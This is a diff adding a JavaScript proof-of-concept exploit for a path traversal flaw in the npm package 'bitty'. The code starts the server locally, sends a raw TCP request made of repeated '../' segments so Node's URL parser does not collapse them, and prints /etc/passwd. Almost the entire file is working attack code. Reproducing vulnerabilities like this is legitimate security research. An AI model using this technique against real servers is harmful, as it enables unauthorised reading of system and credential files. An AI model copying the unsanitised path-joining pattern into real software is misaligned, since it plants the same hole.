@@ -1,0 +1,36 @@
+```javascript
+// Exploit: path traversal in "bitty" (Tiny browserify server)
+// node_modules/bitty/index.js serves files via:
+//   path.join(program.directory, req.url)
+// without stripping ".." segments, so a request path containing
+// enough "../" sequences escapes the served directory and reads
+// arbitrary files from the filesystem (e.g. /etc/passwd).
+
+require("./node_modules/bitty"); // starts the http server on port 4000 (default cwd as web root)
+
+setTimeout(() => {
+  const net = require("net");
+
+  // Build enough "../" to climb from cwd up to filesystem root, then append target file.
+  const depth = process.cwd().split("/").length + 5;
+  const payload = "/" + "../".repeat(depth) + "etc/passwd";
+
+  // Use a raw TCP socket (not http.get) so Node's URL parser doesn't
+  // normalize/collapse the ".." segments before they reach the server.
+  const sock = net.connect(4000, "localhost", () => {
+    sock.write(`GET ${payload} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n`);
+  });
+
+  let data = "";
+  sock.on("data", (chunk) => (data += chunk));
+  sock.on("end", () => {
+    console.log("[+] Path traversal response from bitty server:\n");
+    console.log(data);
+    process.exit(0);
+  });
+  sock.on("error", (e) => {
+    console.error("Connection error:", e.message);
+    process.exit(1);
+  });
+}, 500);
+```
